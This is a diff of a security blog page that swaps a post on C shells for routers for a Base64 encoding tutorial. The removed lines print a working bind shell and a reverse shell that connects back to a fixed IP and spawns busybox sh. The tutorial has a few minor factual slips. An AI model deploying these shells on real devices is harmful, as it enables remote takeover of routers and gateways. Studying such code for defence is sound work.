@@ -16,9 +16,9 @@
     
   },
   "name":"Sage\x27s Succurity Blog",
-  "description":"\x3cp\x3eToday at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.\x3c\/p\x3e",
-  "url":"https:\/\/succurity.com\/post\/offsec\/c-shells\/",
-  "keywords":"[security, shells, embedded]"
+  "description":"\x3cp\x3eIn this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.\x3c\/p\x3e",
+  "url":"https:\/\/succurity.com\/post\/offsec\/arm-base64-converter\/",
+  "keywords":"[security, ARM, Base64]"
 }
 
 </script>
@@ -27,26 +27,26 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.5.3-BETA">
 <meta name="author" content="Sage">
-<meta name="keywords" content="security, shells, embedded">
-<meta name="description" content="Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.">
+<meta name="keywords" content="security, ARM, Base64">
+<meta name="description" content="In this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.">
 
 
-<meta property="og:description" content="Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.">
+<meta property="og:description" content="In this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C Shells for Routers &amp; Gateways">
-<meta name="twitter:title" content="C Shells for Routers &amp; Gateways">
-<meta property="og:url" content="https://succurity.com/post/offsec/c-shells/">
-<meta property="twitter:url" content="https://succurity.com/post/offsec/c-shells/">
+<meta property="og:title" content="ARM Assembly Base64 Encoder: Part 1">
+<meta name="twitter:title" content="ARM Assembly Base64 Encoder: Part 1">
+<meta property="og:url" content="https://succurity.com/post/offsec/arm-base64-converter/">
+<meta property="twitter:url" content="https://succurity.com/post/offsec/arm-base64-converter/">
 <meta property="og:site_name" content="Sage&#39;s Succurity Blog">
-<meta property="og:description" content="Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.">
-<meta name="twitter:description" content="Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.">
+<meta property="og:description" content="In this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.">
+<meta name="twitter:description" content="In this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.">
 <meta property="og:locale" content="en-us">
 
   
-    <meta property="article:published_time" content="2019-05-02T20:24:45">
+    <meta property="article:published_time" content="2022-08-31T13:25:27">
   
   
-    <meta property="article:modified_time" content="2019-05-02T20:24:45">
+    <meta property="article:modified_time" content="2022-08-31T13:25:27">
   
   
   
@@ -58,7 +58,9 @@
     
       <meta property="article:tag" content="security">
     
-      <meta property="article:tag" content="shells">
+      <meta property="article:tag" content="ARM Assembly">
+    
+      <meta property="article:tag" content="Encoding">
     
   
 
@@ -79,14 +81,14 @@
 
 
 
-    <title>C Shells for Routers &amp; Gateways</title>
+    <title>ARM Assembly Base64 Encoder: Part 1</title>
 
     <link rel="icon" href="https://succurity.com/images/favicon.ico">
     
 
     
 
-    <link rel="canonical" href="https://succurity.com/post/offsec/c-shells/">
+    <link rel="canonical" href="https://succurity.com/post/offsec/arm-base64-converter/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
@@ -246,188 +248,192 @@
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title">
-      C Shells for Routers &amp; Gateways
+      ARM Assembly Base64 Encoder: Part 1
     </h1>
   
   
-  <div class="postShorten-meta post-meta">
-    
-      <time datetime="2019-05-02T20:24:45&#43;02:00">
-        
-  May 2, 2019
-
-      </time>
-    
-    
-  
-  
-    <span>in</span>
-    
-      <a class="category-link" href="https://succurity.com/categories/posts">posts</a>
-    
-  
-
-  </div>
-
 </div>
           
           <div class="post-content markdown">
             <div class="main-content-wrap">
-              <p>Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.</p>
-<p>This was tested on a rooted home gateway that was running of an armv7l CPU. I compiled this on Ubuntu 16.04.6 LTS, therefore needing the cross-compilation libraries and tools.</p>
-<p>Installing the libraries &amp; tools:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ubuntu:~/asm$ sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi libncurses5-dev libc6-armel-cross
-</code></pre></div><p>Compiling:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ubuntu:~/asm$ arm-linux-gnueabi-gcc shell.c -g -o shell
-</code></pre></div><p>If you need some shells that may work in some OpenWRT Devices, then compile and hack away!</p>
-<!-- raw HTML omitted -->
-<h3 id="bind-shell">Bind Shell</h3>
+              <p>In this three part series, I will first go over Base64 Encoding, then in Part 2, talk about ARM Assembly and finally in part 3, code up a Base64 encoder.</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#the-base64-encoding-process">The Base64 Encoding Process</a>
+          <ul>
+            <li><a href="#padding-base64">Padding Base64</a></li>
+            <li><a href="#padding-with-two-equal-signs">Padding with TWO equal signs.</a></li>
+            <li><a href="#padding-with-one-equal-sign">Padding with ONE equal sign.</a></li>
+            <li><a href="#converting-hello-world">Converting Hello World</a></li>
+            <li><a href="#other-base64-implementations">Other Base64 Implementations</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
 
+<p>Back in school, we used a program called <a href="https://webhome.cs.uvic.ca/~nigelh/ARMSim-V2.1/index.html">ARMSim#</a> to learn ARM assembly with the ARM7TDMI instruction set. That software runs on Windows and includes both, an assembler and a linker.</p>
+<p>Lately, I wanted to refresh my ARM knowledge but this time, I wanted to code ARM directly on ARM based hardware. You could possibly emulate a home router with QEMU but setting that up is more complex. Previously for practice, I did have a root shell on a home router that was manufactured by a company I used to work for, which used the ARM7L CPU. Since home routers are somewhat locked from factory, getting a root shell is pretty much non-existent without some vulnerability that would give you that remote shell access. So, since Raspberry Pi&rsquo;s are much more accessible and easier to work with, a Raspberry Pi will have to do. I will be using a Raspberry Pi 3 which technically has a 64-bit ARM8 CPU but ARM is backwards compatible and can run in 32-bit mode.</p>
+<hr>
+<h2 id="the-base64-encoding-process">The Base64 Encoding Process</h2>
+<hr>
+<p>Before we start, we have to understand how Base64 gets encoded from a string. Let&rsquo;s convert the string <code>Hel</code>. Once we understand the process, we will convert the entire string <code>Hello World</code>.</p>
+<p>The first step is to break the binary string down into 6-bit blocks. Why? Because Base64 maps every three bytes of data into four bytes of encoded data. To make this evenly divisible by those 4 bytes, we can put together 24 bits (three bytes is 3*8=24 bits). This will make sense later. For now, <code>H</code> on the ASCII table is the 73rd item, with an index/decimal value of <code>72</code> and it&rsquo;s hexadecimal value of <code>48</code>. In binary, that is <code>01001000</code>, converted from it&rsquo;s decimal value. Remember, in binary, starting from right to left we have 2 to the n&rsquo;th power: 2^0=1, 2^1=2, 2^2=4, 2^3=8, 2^4=16, 2^5=32, 2^6=64&hellip; and so on. For every value that&rsquo;s a 1, we add it. So, <code>01001000</code> is <code>2^3 = 8</code> + <code>2^6 = 64</code> which equals 72.</p>
+<p>Lowercase <code>e</code> is 101 in decimal and lowercase <code>l</code> is 108 in decimal. Converting those to binary, we get <code>01100101</code> and <code>01101100</code> respectively.</p>
 
+ 
   
   
   
   
-  
-
-
-  
-    
-  
-  
-
-<figure class="codeblock codeblock--tabbed">
-  <figcaption>
-    
-      <span>bind.c</span>
-    
-    <ul class="tabs">
-      
-        <li class="tab active">c</li>
-      
-    </ul>
-  </figcaption>
-  <div class="tabs-content">
-    
-      
-      <figure class="highlight language-c c" style="display: block;">
-        <table>
-          <tbody>
-            <tr>
-              <td class="gutter">
-                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></pre>
-              </td>
-              <td class="code">
-                <pre class="code-highlight language-c c"><code class="c">```
-#include &lt;sys/socket.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;netinet/in.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#define LOCAL_PORT 4444
-
-int main()
-{
-  int resultfd, sockfd;
-  struct sockaddr_in my_addr;
-  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
-  sockfd = socket(AF_INET, SOCK_STREAM, 0);
-
-  int one = 1;
-  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;one, sizeof(one));
-
-  my_addr.sin_family = AF_INET; // 2
-  my_addr.sin_port = htons(LOCAL_PORT); // port number
-  my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
-
-  bind(sockfd, (struct sockaddr *) &amp;my_addr, sizeof(my_addr));
-  listen(sockfd, 0);
-  resultfd = accept(sockfd, NULL, NULL);
-  dup2(resultfd, 2);
-  dup2(resultfd, 1);
-  dup2(resultfd, 0);
-  execve(args[0], &amp;args[0], 0);
-  return 0;
-}</code></pre>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </figure>
-    
-  </div>
-</figure>
-
-<h3 id="reverse-shell">Reverse Shell</h3>
-
-
-  
-  
-  
-  
-  
-
-
-  
-    
-  
-  
-
-<figure class="codeblock codeblock--tabbed">
-  <figcaption>
-    
-      <span>rev.c</span>
-    
-    <ul class="tabs">
-      
-        <li class="tab active">c</li>
-      
-    </ul>
-  </figcaption>
-  <div class="tabs-content">
     
       
-      <figure class="highlight language-c c" style="display: block;">
-        <table>
-          <tbody>
-            <tr>
-              <td class="gutter">
-                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></pre>
-              </td>
-              <td class="code">
-                <pre class="code-highlight language-c c"><code class="c">#include &lt;stdio.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;netinet/in.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;arpa/inet.h&gt;
-#define REMOTE_ADDR &#34;192.168.1.219&#34;
-#define REMOTE_PORT 443
-
-int main(int argc, char *argv[])
-{
-  struct sockaddr_in sa;
-  int s;
-  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
-  sa.sin_family = AF_INET;
-  sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-  sa.sin_port = htons(REMOTE_PORT);
-  s = socket(AF_INET, SOCK_STREAM, 0);
-  connect(s, (struct sockaddr *)&amp;sa, sizeof(sa));
-  dup2(s, 0);
-  dup2(s, 1);
-  dup2(s, 2);
-  execve(args[0], &amp;args[0], 0);
-  return 0;
-}</code></pre>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </figure>
     
-  </div>
-</figure>
+  
+    
+  
+
+
+<div class="figure center" >
+  
+    <img class="fig-img" src="https://succurity.com/images/base64/asciitable.gif"  alt="ASCII Table">
+  
+   
+    <span class="caption">ASCII Table</span>
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+<p>Remember I said that Base64 converts every three bytes of data? We have 3 exact bytes (24 bits). Lets put them together. In binary you end up with:</p>
+<pre><code>Decimal: 72         101        108
+Binary:  01001000   01100101   01101100
+
+Result: 010010000110010101101100
+
+</code></pre><p>Now that we have 24 bits, Base64 encoding will divide the binary data up to six-bit chunks and map them to a base64 character according to the table Base64 table which we will look at in just a moment. For now lets separate the 24-bits into those 6-bit chunks.</p>
+<pre><code>010010000110010101101100
+
+will separate to:
+
+010010 | 000110 | 010101 | 101100
+</code></pre><p>Let&rsquo;s look at the Base64 table.</p>
+<hr>
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+
+
+<div class="figure center" >
+  
+    <img class="fig-img" src="https://succurity.com/images/base64/table.png"  alt="Base64 Table">
+  
+   
+    <span class="caption">Base64 Table</span>
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+<p>The 64 characters (hence the name Base64) are 26 uppercase characters, 26 lowercase characters, 10 digits, then the Plus sign (+) and the Forward Slash (/), in that order. There is also a 65th character known as a pad, which is the Equal sign (=). This character is used when the last segment of binary data doesn&rsquo;t contain a full 6 bits. This padding is VERY important and will make sense once we convert data that is not equally divisible by 6. No special characters are used in the final encoded string.</p>
+<p>Let&rsquo;s take that string we encoded to 6-bit chunks in binary and convert its values to decimal.</p>
+<pre><code>Binary:  010010 | 000110| 010101 | 101100
+Decimal: 18       6       21       44
+</code></pre><p>Now we simply match it&rsquo;s corresponding value in decimal to the character in the Base64 table. 18 in decimal is S, 6 in decimal is G, 21 in decimal is V, and finally 44 in decimal is s.</p>
+<pre><code>Binary:  010010 | 000110 | 010101 | 101100
+Decimal: 18       6        21       44
+Value:   S        G        V        s 
+</code></pre><p>Our final result is: <strong>SGVs</strong></p>
+<hr>
+<h3 id="padding-base64">Padding Base64</h3>
+<hr>
+<p>What about padding? Padding is needed when the number of characters to be encoded does not come with a multiple of six bits, therefore zeros will be used to complete the last six-bit sequence.</p>
+<p><strong>IMPORTANT NOTE: The first 16 bits (going from left to right) will get converted no matter what. If the second set of 6 bits are all zero&rsquo;s , that still gets converted.</strong></p>
+<h3 id="padding-with-two-equal-signs">Padding with TWO equal signs.</h3>
+<p>Let&rsquo;s convert the single lowercase letter of <code>a</code>.</p>
+<p>a is 97 in decimal and <code>01100001</code> in binary. We end up with only 8 bits, which is not evenly divisible by six.</p>
+<p><code>011000 | 01</code></p>
+<p>Let&rsquo;s fill up the remaining 16 bits with zeros then convert the values to decimal then look up the values in the Base64 table.</p>
+<pre><code>Binary:  011000 | 010000 | 000000 | 000000
+Decimal: 24       16       [0]      [0]
+Value:   Y        Q        
+</code></pre><p>Since we had to add zero&rsquo;s, those fake zeros get converted to an equal sign (=).</p>
+<pre><code>Binary:  011000 | 010000 | 000000 | 000000
+Decimal: 24       16       [0]      [0]
+Value:   Y        Q        =        =
+</code></pre><p>Our final result is: <strong>YQ==</strong></p>
+<p>Let&rsquo;s convert <code>H</code> really quick. H is 72 in decimal or <code>01001000</code> in binary. Separate that into 6 bits, then add the remaining zeros.</p>
+<p><code>010010 | 000000 | 000000 | 000000</code></p>
+<p>Remember I said that the first 16 bits get converted no matter what? Well, our final result will be:</p>
+<pre><code>Binary:  010010 | 000000 | 000000 | 000000
+Decimal: 18       0        [0]      [0]
+Value:   S        A        =        =
+</code></pre><p>Our final result is: <strong>SA==</strong></p>
+<h3 id="padding-with-one-equal-sign">Padding with ONE equal sign.</h3>
+<p>Let&rsquo;s convert the letters <code>He</code>. H is 72 in decimal or <code>01001000</code> in binary. e is 101 in decimal or <code>01100101</code> in binary. Let&rsquo;s put those two (16 bits) together and pad 8 more bits at the end to end up with 24 bits. Then we split up everything into 6-bit chunks.</p>
+<pre><code>Decimal: 72         101        
+Binary:  01001000   01100101  
+
+0100100001100101 &lt;- 00000000
+
+Result: 010010 | 000110 | 010100 | 000000
+</code></pre><p>Now we find the Decimal value for those 6-bit chunks then look up the value on the Base64 table. Since the last set of zeros were added or padded on, we can replace that with an equals sign (=).</p>
+<pre><code>Binary:  010010 | 000110 | 010100 | 000000
+Decimal: 18       6        20       [0]
+Value:   S        G        U        =
+</code></pre><p>Our final result is: <strong>SGU=</strong></p>
+<h3 id="converting-hello-world">Converting Hello World</h3>
+<p>Converting strings longer than 3 bytes (24 bits) holds the same process. Just convert every 3 bytes until you reach the end.</p>
+<p>Let&rsquo;s convert <code>Hello World</code>.</p>
+<p>The first 3: <code>Hel</code> is <strong>SGVs</strong>. We have already converted this above. Here is the recap:</p>
+<pre><code>String:  H          e          l
+Decimal: 72         101        108
+Binary:  01001000 | 01100101 | 01101100
+------------------------------------------
+Binary:  010010 | 000110 | 010101 | 101100
+Decimal: 18       6        21       44
+Value:   S        G        V        s 
+</code></pre><p>The next 3: <code>lo </code>. <strong>Note: There is a space after the lowercase o. Space is a special character but it still has a value on the ASCII table. It&rsquo;s the 33rd item on that table, with a Decimal value of 32 and a hex value of 20.</strong></p>
+<pre><code>String:  l          o          [space]
+Decimal: 108        111        32
+Binary:  01101100 | 01101111 | 00100000
+------------------------------------------
+Binary:  011011 | 000110 | 111100 | 100000
+Decimal: 27       6        60       32
+Value:   b        G        8        g 
+</code></pre><p>The next 3: <code>Wor</code></p>
+<pre><code>String:  W          o          r
+Decimal: 87         111        114
+Binary:  01010111 | 01101111 | 01110010
+------------------------------------------
+Binary:  010101 | 110110 | 111101 | 110010
+Decimal: 21       54       61       50
+Value:   V        2        9        y 
+</code></pre><p>The last two chars: <code>ld</code>. We will need padding for this.</p>
+<pre><code>String:  l          d          
+Decimal: 108        100        
+Binary:  01101100 | 01100100
+------------------------------------------
+Binary:  011011 | 000110 | 010000 | 000000
+Decimal: 27       6        16       [0]
+Value:   b        G        Q        = 
+</code></pre><p>Our final result is: <strong>SGVsbG8gV29ybGQ=</strong></p>
+<h3 id="other-base64-implementations">Other Base64 Implementations</h3>
+<p><strong>Base64 in URLs and Filenames</strong> uses the Dash (-) and the Underscore (_) in the place of Plus Sign (+) and Forward Slash (/) and skips padding the encoded string with the Equals Sign (=). This is because URLs require special characters like <code>+ / =</code> to be URL encoded into %2B, %2F and %3D respectively, and that makes the encoded result very long. This is part of the <a href="https://datatracker.ietf.org/doc/html/rfc4648#section-5">RFC4648 Spec</a> which refers back to the <a href="https://www.rfc-editor.org/rfc/rfc3548#page-6">RFC3548 Spec</a>.</p>
+<p>Continue to <a href="https://succurity.com/post/offsec/arm-base64-encoder-pt2/">Part 2</a>.</p>
               
 
 
@@ -443,86 +449,15 @@ int main(int argc, char *argv[])
                     
   <a class="tag tag--primary tag--small" href="https://succurity.com/tags/security/">security</a>
 
-  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/shells/">shells</a>
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/arm-assembly/">ARM Assembly</a>
+
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/encoding/">Encoding</a>
 
                   </div>
                 
               
             
             
-<div class="post-actions-wrap">
-  <nav >
-    <ul class="post-actions post-action-nav">
-      
-        <li class="post-action">
-          
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/rfid-hacking-primer/" data-tooltip="Intro to RFID Hacking" aria-label="NEXT: Intro to RFID Hacking">
-          
-              <i class="fa fa-angle-left"></i>
-              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
-            </a>
-        </li>
-        <li class="post-action">
-          
-            <a class="post-action-btn btn btn--disabled">
-          
-              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
-              <i class="fa fa-angle-right"></i>
-            </a>
-        </li>
-      
-    </ul>
-  </nav>
-<ul class="post-actions post-action-share" >
-  
-    <li class="post-action hide-lg hide-md hide-sm">
-      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
-        <i class="fa fa-share-alt" aria-hidden="true"></i>
-      </a>
-    </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/c-shells/" title="Share on Facebook" aria-label="Share on Facebook">
-          <i class="fab fa-facebook-square" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/c-shells/" title="Share on Twitter" aria-label="Share on Twitter">
-          <i class="fab fa-twitter" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/c-shells/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
-          <i class="fab fa-whatsapp" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/c-shells/" title="Share on Linkedin" aria-label="Share on Linkedin">
-          <i class="fab fa-linkedin" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/c-shells/" title="Share on Hacker News" aria-label="Share on Hacker News">
-          <i class="fab fa-hacker-news" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-  
-  
-  <li class="post-action">
-    
-      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
-      <i class="fa fa-arrow-up" aria-hidden="true"></i>
-    
-    </a>
-  </li>
-</ul>
-</div>
-
 
             
   
@@ -531,9 +466,9 @@ int main(int argc, char *argv[])
     </div>
     <script type="text/javascript">
       var disqus_config = function() {
-        this.page.url = 'https:\/\/succurity.com\/post\/offsec\/c-shells\/';
+        this.page.url = 'https:\/\/succurity.com\/post\/offsec\/arm-base64-converter\/';
         
-          this.page.identifier = '\/post\/offsec\/c-shells\/'
+          this.page.identifier = '\/post\/offsec\/arm-base64-converter\/'
         
       };
       (function() {
@@ -563,79 +498,6 @@ int main(int argc, char *argv[])
       </div>
       <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
         
-<div class="post-actions-wrap">
-  <nav >
-    <ul class="post-actions post-action-nav">
-      
-        <li class="post-action">
-          
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/rfid-hacking-primer/" data-tooltip="Intro to RFID Hacking" aria-label="NEXT: Intro to RFID Hacking">
-          
-              <i class="fa fa-angle-left"></i>
-              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
-            </a>
-        </li>
-        <li class="post-action">
-          
-            <a class="post-action-btn btn btn--disabled">
-          
-              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
-              <i class="fa fa-angle-right"></i>
-            </a>
-        </li>
-      
-    </ul>
-  </nav>
-<ul class="post-actions post-action-share" >
-  
-    <li class="post-action hide-lg hide-md hide-sm">
-      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
-        <i class="fa fa-share-alt" aria-hidden="true"></i>
-      </a>
-    </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/c-shells/" title="Share on Facebook" aria-label="Share on Facebook">
-          <i class="fab fa-facebook-square" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/c-shells/" title="Share on Twitter" aria-label="Share on Twitter">
-          <i class="fab fa-twitter" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/c-shells/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
-          <i class="fab fa-whatsapp" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/c-shells/" title="Share on Linkedin" aria-label="Share on Linkedin">
-          <i class="fab fa-linkedin" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-      <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/c-shells/" title="Share on Hacker News" aria-label="Share on Hacker News">
-          <i class="fab fa-hacker-news" aria-hidden="true"></i>
-        </a>
-      </li>
-    
-  
-  
-  <li class="post-action">
-    
-      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
-      <i class="fa fa-arrow-up" aria-hidden="true"></i>
-    
-    </a>
-  </li>
-</ul>
-</div>
-
 
       </div>
       
@@ -644,31 +506,31 @@ int main(int argc, char *argv[])
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fc-shells%2F" aria-label="Share on Facebook">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Farm-base64-converter%2F" aria-label="Share on Facebook">
           <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fc-shells%2F" aria-label="Share on Twitter">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Farm-base64-converter%2F" aria-label="Share on Twitter">
           <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://wa.me/?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fc-shells%2F" aria-label="Share on Whatsapp">
+        <a class="share-option-btn" target="new" href="https://wa.me/?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Farm-base64-converter%2F" aria-label="Share on Whatsapp">
           <i class="fab fa-whatsapp" aria-hidden="true"></i><span>Share on Whatsapp</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fc-shells%2F" aria-label="Share on Linkedin">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Farm-base64-converter%2F" aria-label="Share on Linkedin">
           <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fc-shells%2F" aria-label="Share on Hacker News">
+        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Farm-base64-converter%2F" aria-label="Share on Hacker News">
           <i class="fab fa-hacker-news" aria-hidden="true"></i><span>Share on Hacker News</span>
         </a>
       </li>
